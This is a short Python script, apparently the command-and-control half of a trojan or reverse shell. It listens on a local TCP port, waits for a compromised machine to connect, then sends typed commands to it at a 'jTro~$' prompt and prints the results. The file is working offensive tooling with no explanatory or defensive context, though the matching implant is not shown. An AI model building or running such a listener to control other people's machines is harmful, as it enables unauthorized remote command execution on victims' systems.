# !/usr/bin/python3
import socket


class Listener:
    def __init__(self, host, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((host, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection.")
        self.conn, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute(self, command):
        self.conn.send(command.encode('ascii'))
        return self.conn.recv(1024)

    def run(self):
        while True:
            command = input('jTro~$')
            result = self.execute(command)
            print(result)


jtro_listener = Listener('127.0.0.1', 4545)
jtro_listener.run()
